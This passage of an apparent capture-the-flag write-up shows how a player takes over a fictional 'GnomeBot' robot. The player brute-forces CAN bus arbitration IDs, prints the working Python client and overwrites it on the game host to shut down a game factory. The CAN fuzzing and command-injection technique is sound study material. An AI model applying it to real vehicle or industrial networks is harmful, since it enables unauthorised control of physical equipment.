+      It sends messages with <code>is_extended_id=False</code> and an <strong>empty</strong> payload
+      (<code>data=[]</code>).
+    </li>
+    <li>
+      The <code>COMMAND_MAP</code> hard-codes IDs (<code>0x656</code>–<code>0x659</code>) and even
+      notes they may be wrong: <em>“I think these are wrong with newest update”</em>.
+    </li>
+  </ul>
+
+  <p>
+    That’s a big clue: if the gnome’s movement signals were changed in a newer update, the web UI
+    may be sending different arbitration IDs (or different data bytes / DLC), and this script is
+    still using the old ones. The quickest way forward is to <strong>listen/sniff</strong> the bus,
+    identify the real message format, then update <code>COMMAND_MAP</code> (and possibly the payload)
+    to match.
+  </p>
+</div>
+
+<!-- AWS shell -->
+<div class="kc-terminal-window kc-terminal-window--wrap">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">☁️</span>
+    <span class="kali-title">AWS Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text kc-no-wheel"><code># cat canbus_client.py
+#!/usr/bin/python3
+import can
+import time
+import argparse
+import sys
+import datetime # To show timestamps for received messages
+
+# Define CAN IDs (I think these are wrong with newest update, we need to check the actual device documentation)
+COMMAND_MAP = {
+    "up": 0x656,
+    "down": 0x657,
+    "left": 0x658,
+    "right": 0x659,
+    # Add other command IDs if needed
+}
+# Add 'listen' as a special command option
+COMMAND_CHOICES = list(COMMAND_MAP.keys()) + ["listen"]
+
+IFACE_NAME = "gcan0"
+
+def send_command(bus, command_id):
+    """Sends a CAN message with the given command ID."""
+    message = can.Message(
+        arbitration_id=command_id,
+        data=[], # No specific data needed for these simple commands
+        is_extended_id=False
+    )
+    try:
+        bus.send(message)
+        print(f"Sent command: ID=0x{command_id:X}")
+    except can.CanError as e:
+        print(f"Error sending message: {e}")
+
+def listen_for_messages(bus):
+    """Listens for CAN messages and prints them."""
+    print(f"Listening for messages on {bus.channel_info}. Press Ctrl+C to stop.")
+    try:
+        # Iterate indefinitely over messages received on the bus
+        for msg in bus:
+            # Get current time for the timestamp
+            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3] # Milliseconds precision
+            print(f"{timestamp} | Received: {msg}")
+            # You could add logic here to filter or react to specific messages
+            # if msg.arbitration_id == 0x100:
+            #    print("  (Noise message)")
+
+    except KeyboardInterrupt:
+        print("\nStopping listener...")
+    except Exception as e:
+        print(f"\nAn error occurred during listening: {e}")
+
+def main():
+    parser = argparse.ArgumentParser(description="Send CAN bus commands or listen for messages.")
+    parser.add_argument(
+        "command",
+        choices=COMMAND_CHOICES,
+        help=f"The command to send ({', '.join(COMMAND_MAP.keys())}) or 'listen' to monitor the bus."
+    )
+    args = parser.parse_args()
+
+    try:
+        # Initialize the CAN bus interface
+        bus = can.interface.Bus(channel=IFACE_NAME, interface='socketcan', receive_own_messages=False) # Set receive_own_messages if needed
+        print(f"Successfully connected to {IFACE_NAME}.")
+    except OSError as e:
+        print(f"Error connecting to CAN interface {IFACE_NAME}: {e}")
+        print(f"Make sure the {IFACE_NAME} interface is up ('sudo ip link set up {IFACE_NAME}')")
+        print("And that you have the necessary permissions.")
+        sys.exit(1)
+    except Exception as e:
+        print(f"An unexpected error occurred during bus initialization: {e}")
+        sys.exit(1)
+
+    if args.command == "listen":
+        listen_for_messages(bus)
+    else:
+        command_id = COMMAND_MAP.get(args.command)
+        if command_id is None: # Should not happen due to choices constraint
+            print(f"Invalid command for sending: {args.command}")
+            bus.shutdown()
+            sys.exit(1)
+        send_command(bus, command_id)
+        # Give a moment for the message to be potentially processed if listening elsewhere
+        time.sleep(0.1)
+
+    # Shutdown the bus connection cleanly
+    bus.shutdown()
+    print("CAN bus connection closed.")
+
+if __name__ == "__main__":
+    main()</code></pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Taking a look at <strong>README.md</strong> revealed a much more complete CAN protocol reference for
+    the <code>gcan0</code> interface — including a set of known request/response message IDs and a clear
+    <strong>TODO</strong> calling out that the <em>movement commands</em> (Up/Down/Left/Right) are not finalized.
+  </p>
+
+  <p>
+    This explains why <code>canbus_client.py</code> is likely failing to move the gnome: its hard-coded movement IDs
+    (<code>0x656</code>–<code>0x659</code>) don’t appear anywhere in the documented list, and the README explicitly says
+    movement IDs are “not totally settled yet.”
+  </p>
+</div>
+
+<!-- AWS shell -->
+<div class="kc-terminal-window kc-terminal-window">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">☁️</span>
+    <span class="kali-title">AWS Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <pre class="kc-terminal-text kc-no-wheel"><code># cat README.md
+# 🎄 GnomeBot CAN Bus Protocol - Top Secret Workshop Edition!
+
+Ho ho hold on there! Welcome to the inner workings of the GnomeBot's communication system. This marvelous contraption uses the **CAN (Controller Area Network)** bus to chatter away about its status and sometimes even listen to requests. It's like the reindeer telegraph, but with more wires and less sneezing.
+
+This document details the known signals whizzing around on the `gcan0` interface. Remember, all multi-byte values are sent **Big Endian** (Most Significant Byte first), just like how Santa lists the nicest kids first!
+
+---
+
+## 🎁 CAN Data Requests (Client -> GnomeBot )
+
+Sometimes, you need to poke the GnomeBot to get specific information *right now*. Send one of these messages, and the  *should* reply with the corresponding Status/Data message (see below).
+
+| CAN ID (Hex) | Constant Name             | Description                                      | Data Sent |
+| :----------- | :------------------------ | :----------------------------------------------- | :-------- |
+| `0x400`      | `requestBatteryVoltageID` | Asks for the current battery voltage reading.    | (Empty)   |
+| `0x470`      | `requestGPSFixID`         | Inquires about the current GPS fix status.       | (Empty)   |
+| `0x410`      | `requestMotorSpeedLeftID` | Requests the current speed of the left motor.    | (Empty)   |
+| `0x460`      | `requestSystemTempID`     | Asks for the GnomeBot's internal temperature.    | (Empty)   |
+| `0x4C0`      | `requestPayloadStatusID`  | Requests the current status of the payload/gripper. | (Empty)   |
+
+---
+
+## ✨ CAN Status & Data Responses (GnomeBot  -> Client)
+
+These messages are the GnomeBot  telling the world (or at least the CAN bus) what's going on. Some are sent automatically like clockwork (Periodic), some only when asked (Response Only), and some do both!
+
+| CAN ID (Hex) | Constant Name                | Behavior              | Data Bytes | Data Type        | Description & Units/Meaning                                                                 |
+| :----------- | :--------------------------- | :-------------------- | :--------- | :--------------- | :------------------------------------------------------------------------------------------ |
+| `0x300`      | `statusBatteryVoltageID`     | Response Only         | 2          | `uint16`         | Battery voltage in **millivolts (mV)**. E.g., `0x30D4` = 12500mV = 12.5V.                     |
+| `0x310`      | `statusMotorSpeedLeftID`     | Periodic + Response   | 2          | `int16`          | Left motor speed in **RPM**. Can be negative for reverse!                                   |
+| `0x311`      | `statusMotorSpeedRightID`    | Periodic              | 2          | `int16`          | Right motor speed in **RPM**.                                                               |
+| `0x320`      | `statusSonarDistanceFrontID` | Periodic              | 2          | `uint16`         | Front sonar distance reading in **centimeters (cm)**.                                       |
+| `0x321`      | `statusSonarDistanceRearID`  | Periodic              | 2          | `uint16`         | Rear sonar distance reading in **centimeters (cm)**.                                        |
+| `0x330`      | `statusIMUDataID`            | Periodic              | 2          | `byte[0]`, `byte[1]` | Byte 0: Simple sequence/second counter. Byte 1: Status flags (e.g., `0x01` = OK).     |
+| `0x340`      | `statusHeadlightID`          | Periodic              | 1          | `uint8`          | Headlight status: `0x00` = Off, `0x01` = On. Is it Rudolph's spare nose?                  |
+| `0x350`      | `statusWifiStatusID`         | Periodic              | 2          | `byte[0]`, `byte[1]` | Byte 0: WiFi Signal Strength (0-100%). Byte 1: Status (`0`=Disc, `1`=Conn).           |
+| `0x351`      | `statusBluetoothStatusID`    | Periodic              | 2          | `byte[0]`, `byte[1]` | Byte 0: Number of paired devices. Byte 1: Status (`0`=Off, `1`=On, `2`=Paired).          |
+| `0x360`      | `statusSystemTempID`         | Periodic + Response   | 1          | `int8`           | Internal system temperature in **degrees Celsius (°C)**. Keep it cool, like the North Pole! |
+| `0x370`      | `statusGPSFixID`             | Response Only         | 1          | `uint8`          | GPS Fix Status: `0` = No Fix, `1` = 2D Fix, `2` = 3D Fix.                                 |
+| `0x380`      | `statusWheelOdomLeftID`      | Periodic              | 4          | `uint32`         | Cumulative left wheel odometry ticks. Rollin' towards Christmas!                           |
+| `0x381`      | `statusWheelOdomRightID`     | Periodic              | 4          | `uint32`         | Cumulative right wheel odometry ticks.                                                     |
+| `0x390`      | `statusAmbientLightID`       | Periodic              | 2          | `uint16`         | Ambient light sensor reading in **Lux**. Brighter than Rudolph's nose?                      |
+| `0x391`      | `statusHumidityID`           | Periodic              | 1          | `uint8`          | Relative humidity percentage (%). Is it snowing?                                          |
+| `0x392`      | `statusPressureID`           | Periodic              | 4          | `uint32`         | Barometric pressure in **Pascals (Pa)**.                                                  |
+| `0x3A0`      | `statusCurrentDrawID`        | Periodic              | 2          | `int16`          | Main battery current draw in **milliamps (mA)**. How much juice does this thing use?!   |
+| `0x3B0`      | `statusEstopStatusID`        | Periodic              | 1          | `uint8`          | Emergency Stop Status: `0x00` = OK, `0x01` = PRESSED! (Hopefully not!)                    |
+| `0x3C0`      | `statusPayloadStatusID`      | Periodic + Response   | 1          | `uint8` (Bitmap) | Payload Status: Bit 0 (`0x01`): Gripper Open, Bit 1 (`0x02`): Sensor Active.        |
+| `0x3D0`      | `statusNavStatusID`          | Periodic              | 1          | `uint8`          | Navigation System Status: `0`=Idle, `1`=Navigating, `2`=Reached, `3`=Failed.          |
+| `0x3E0`      | `statusFanSpeedID`           | Periodic              | 1          | `uint8`          | Cooling fan speed percentage (%). Keeping the circuits frosty.                          |
+| `0x3FF`      | `statusHeartbeatID`          | Periodic              | 1          | `uint8`          | Heartbeat counter. Increments with each message. Lub-dub, lub-dub... is it alive?!      |
+
+---
+## 🛠️ Movement Commands & Acknowledgments (Client <-> GnomeBot )
+```
+TODO: There are more signals related to controlling the GnomeBot's movement
+(Up/Down/Left/Right) and the acknowledgments sent back by the bot.
+These involve CAN IDs that are not totally settled yet. We are still polishing
+the documentation for these - check back after eggnog break!
+```
+---
+</code></pre>
+</div>
+
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Next I focused on why the gnome <em>wouldn’t move</em>. The README listed a bunch of known CAN IDs in use,
+    so instead of guessing inside those ranges, I modified <code>canbus_client.py</code> to:
+  </p>
+
+  <ul>
+    <li>Map keyboard controls to <strong>W/A/S/D</strong> (Up/Left/Down/Right).</li>
+    <li>
+      For each keypress, <strong>spam ~200 CAN frames</strong> (fast burst) so even “edge triggered” or lossy handling
+      would still catch at least one valid movement command.
+    </li>
+    <li>
+      Iterate through CAN IDs while <strong>avoiding</strong> the IDs already documented in <code>README.md</code>, so I
+      didn’t interfere with the known status/request traffic.
+    </li>
+  </ul>
+
+  <p>
+    Then I switched back to the web UI and pressed each movement button while watching the bot. When the bot moved,
+    I knew the correct movement command ID was inside the current test range for that direction. After a few rounds of
+    narrowing the ranges, I landed on a final mapping that consistently restored movement.
+  </p>
+
+  <p class="kc-intro">
+    Final result: a cleaned-up <code>canbus_client.py</code> with stable movement command IDs for W/A/S/D.
+  </p>
+</div>
+
+<!-- Final canbus_client.py -->
+<div class="kc-code-window">
+  <div class="kc-code-titlebar">
+    <span class="kc-code-icon">&lt;/&gt;</span>
+    <span class="kc-code-title">canbus_client.py (Final)</span>
+
+    <button
+    class="kc-code-copy-btn kc-code-copy"
+    type="button"
+    data-copy-target="#canbus-final"
+    aria-label="Copy script"
+    title="Copy"
+    >
+    <i class="fas fa-copy" aria-hidden="true"></i>
+    <span>Copy</span>
+    </button>
+  </div>
+
+  <!-- kc-no-wheel keeps page scroll normal; the code block gets its own scrollbar -->
+  <pre class="kc-code-block kc-no-wheel"><code id="canbus-final" class="language-python">#!/usr/bin/python3
+import can
+import sys
+import datetime
+ 
+IFACE_NAME = "gcan0"
+ 
+# MY CUSTOM MAPPING
+COMMAND_MAP = {
+    "up":    0x201,
+    "down":  0x202,
+    "left":  0x203,
+    "right": 0x204,
+}
+ 
+def send_command(bus, cmd_id, direction):
+    msg = can.Message(arbitration_id=cmd_id, data=[], is_extended_id=False)
+    try:
+        bus.send(msg)
+        ts = datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]
+        print(f"{ts} | [TEST] {direction.upper():>5} → 0x{cmd_id:03X}")
+    except can.CanError as e:
+        print(f"ERROR 0x{cmd_id:03X}: {e}")
+ 
+def main():
+    if len(sys.argv) != 2 or sys.argv[1] not in COMMAND_MAP:
+        print("Usage: python3 canbus_client.py [up|down|left|right]")
+        sys.exit(1)
+ 
+    direction = sys.argv[1]
+    cmd_id = COMMAND_MAP[direction]
+ 
+    try:
+        bus = can.interface.Bus(channel=IFACE_NAME, interface='socketcan')
+        print(f"Sending {direction} → 0x{cmd_id:03X}")
+    except Exception as e:
+        print(f"CAN init failed: {e}")
+        sys.exit(1)
+ 
+    send_command(bus, cmd_id, direction)
+    bus.shutdown()
+ 
+if __name__ == "__main__":
+    main()</code></pre>
+</div>
+
+
+
+
+<!-- Write-up bubble (text only) -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    Now that we had confirmed the correct CAN IDs for movement, we switched back to our AWS shell and
+    overwrote the container’s existing <code>canbus_client.py</code> with our working mapping. Finally, we
+    marked it executable so the web UI could reliably invoke it.
+  </p>
+</div>
+
+<!-- AWS shell (same formatting as your good one) -->
+<div class="kc-terminal-window">
+  <div class="kali-titlebar">
+    <span class="kali-titlebar-icon">☁️</span>
+    <span class="kali-title">AWS Shell</span>
+    <span class="kali-titlebar-buttons">
+      <span class="kali-btn kali-btn-min"></span>
+      <span class="kali-btn kali-btn-max"></span>
+      <span class="kali-btn kali-btn-close"></span>
+    </span>
+  </div>
+
+  <!-- kc-no-wheel keeps page scroll normal; terminal gets its own scrollbar -->
+  <pre class="kc-terminal-text kc-no-wheel"><code># cat &gt; /app/canbus_client.py &lt;&lt; 'EOF'
+#!/usr/bin/python3
+import can
+import sys
+import datetime
+
+IFACE_NAME = "gcan0"
+
+# YOUR CUSTOM MAPPING
+COMMAND_MAP = {
+    "up":    0x201,
+    "down":  0x202,
+    "left":  0x203,
+    "right": 0x204,
+}
+
+def send_command(bus, cmd_id, direction):
+    msg = can.Message(arbitration_id=cmd_id, data=[], is_extended_id=False)
+    try:
+        bus.send(msg)
+        ts = datetime.datetime.now().strftime('%H:%M:%S.%f')[:-3]
+        print(f"{ts} | [TEST] {direction.upper():&gt;5} → 0x{cmd_id:03X}")
+    except can.CanError as e:
+        print(f"ERROR 0x{cmd_id:03X}: {e}")
+
+def main():
+    if len(sys.argv) != 2 or sys.argv[1] not in COMMAND_MAP:
+        print("Usage: python3 canbus_client.py [up|down|left|right]")
+        sys.exit(1)
+
+    direction = sys.argv[1]
+    cmd_id = COMMAND_MAP[direction]
+
+    try:
+        bus = can.interface.Bus(channel=IFACE_NAME, interface='socketcan')
+        print(f"Sending {direction} → 0x{cmd_id:03X}")
+    except Exception as e:
+        print(f"CAN init failed: {e}")
+        sys.exit(1)
+
+    send_command(bus, cmd_id, direction)
+    bus.shutdown()
+
+if __name__ == "__main__":
+    main()
+EOF
+# chmod +x /app/canbus_client.py</code></pre>
+</div>
+
+<!-- Write-up bubble (text only) -->
+<div class="kc-note-bubble">
+  <span class="kc-note-label">Write-up notes</span>
+
+  <p>
+    With the movement commands restored, we navigated the bot to the power switch and successfully
+    shut down the factory.
+  </p>
+</div>
+
+<!-- Screenshot block (outside the bubble) -->
+<div class="kc-ptas-screenshot">
+  <div class="kc-ptas-image-wrapper">
+    <img
+      src="factory_shutdown.png"
+      alt="Factory successfully powered down"
+      class="kc-ptas-thumb"
+      data-full-src="factory_shutdown.png"
+    >
+
+    <button
+      class="kc-ptas-enlarge-btn"
+      type="button"
+      data-enlarge-target="factory_shutdown.png"
+    >
+      <i class="fas fa-search-plus" aria-hidden="true"></i>
+      Enlarge
+    </button>
+  </div>
+
+  <div class="kc-ptas-caption">Congratulations — the factory was successfully powered down!</div>
+</div>
+
+<!-- Solution dialogue banner -->
+<div class="kc-convo-header kc-solution-dialog-header">
+  <span class="kc-convo-icon">
+    <i class="fas fa-comment-dots" aria-hidden="true"></i>
+  </span>
+  <span class="kc-convo-title">Solution dialogue:</span>
+</div>
+
+<div class="kc-objective-detail kc-objective-detail--no-panel">
+  <div class="kc-convo-bubble">
+    <div class="kc-convo-avatar">
+      <img src="chrisdavis-portrait.png"
+           alt="Thomas Bouve avatar">
+      <div class="kc-convo-name">Chris Davis</div>
+    </div>
+
+    <div class="kc-convo-text">
+      <p>
+        Excellent work! You've successfully taken control of the gnome - look at that interface responding to our commands now.
+      </p>
+      <p>
+        Time to turn this little rebel against its own manufacturing operation and shut them down for good!
+      </p>
+      <div class="kc-convo-actions">
+        <button class="kc-convo-play-btn kc-convo-play-btn-complete" type="button">
+          <i class="fas fa-play" aria-hidden="true"></i>
+          <span>Play Audio</span>
+        </button>
+      </div>
+    </div>
+  </div>
+</div>       <!-- /.kc-section -->
+
+
+
+
